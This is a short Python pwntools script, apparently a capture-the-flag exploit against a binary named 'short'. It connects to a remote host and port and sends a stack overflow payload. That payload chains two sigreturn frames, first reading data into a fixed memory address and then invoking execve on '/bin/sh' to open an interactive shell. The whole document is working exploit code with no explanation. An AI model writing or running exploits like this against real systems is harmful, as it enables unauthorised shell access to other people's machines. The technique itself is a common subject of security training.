from pwn import *
context(os='linux',arch='amd64',log_level='debug')
binary=ELF('./short')
#io=process('./short')
io=remote('172.29.14.114',9999)
pause()
#0x0000000000400440 : pop rbp ; ret

ret=0x00007FFDA02F5360
buf=0x00007FFDA02F5350
_start=0x00000000004003E0
_gadgets=0x00000000004004D6


frameExecve = SigreturnFrame()
frameExecve.rax = constants.SYS_read
frameExecve.rax = 0x0
frameExecve.rdi = 0x0
frameExecve.rsi = 0x0000000000601050
frameExecve.rdx = 0x100
frameExecve.rip = 0x0000000000400517
frameExecve.rsp = 0x0000000000601058

io.send((ret-buf)*'a'+p64(0x0000000000400440)+p64(0x0000000000400517)+p64(_gadgets)+str(frameExecve))

frameExecve = SigreturnFrame()
frameExecve.rax = constants.SYS_read
frameExecve.rax = 0x3b
frameExecve.rdi = 0x0000000000601050
frameExecve.rsi = 0x0
frameExecve.rdx = 0x0
frameExecve.rip = 0x0000000000400517
frameExecve.rsp = 0x0000000000601058
io.send('/bin/sh\x00'+p64(0x0000000000400440)+p64(0x0000000000400517)+p64(_gadgets)+str(frameExecve))
io.interactive()
